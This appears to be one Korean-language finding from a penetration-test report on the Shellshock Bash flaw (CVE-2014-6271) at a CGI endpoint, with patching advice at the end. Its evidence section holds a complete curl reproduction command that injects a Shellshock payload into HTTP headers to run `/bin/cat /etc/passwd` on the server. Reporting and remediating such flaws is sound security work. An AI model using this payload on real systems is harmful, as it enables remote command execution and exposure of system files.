## ShellShock - Remote Code Execution
- **End-Point**: `http://10.64.162.78/cgi-bin/test.cgi/debug.cgi`
- **영향**: 원격 코드 실행(RCE)을 통해 공격자가 시스템 권한을 탈취하고 데이터 유출 및 시스템을 완전히 장악할 수 있음.
- **설명**: GNU Bash 4.3 이하 버전에서 환경 변수에 포함된 함수 정의 뒤의 문자열을 부적절하게 실행하는 결함(CVE-2014-6271)을 이용하여, Apache mod_cgi 등 환경 변수를 설정하는 경계를 넘어 임의 명령을 실행하는 취약점임.
- **근거**: HTTP 요청 헤더에 `() { :; };` 패턴과 함께 `/bin/cat /etc/passwd` 명령을 삽입하여 시스템 파일 노출을 시도함. 재현 명령어: `curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Cookie: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ' -H 'Referer: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ' -H 'Shellshock: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ' -H 'User-Agent: Mozilla/5.0 (CentOS; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0' 'http://10.64.162.78/cgi-bin/test.cgi/debug.cgi'`
- **대응**: 취약점이 패치된 최신 버전의 GNU Bash로 업데이트를 수행함.
- **조치**: 운영체제 패키지 관리자를 통해 Bash 업데이트 명령인 `yum update bash` 또는 `apt-get install --only-upgrade bash`를 실행함.
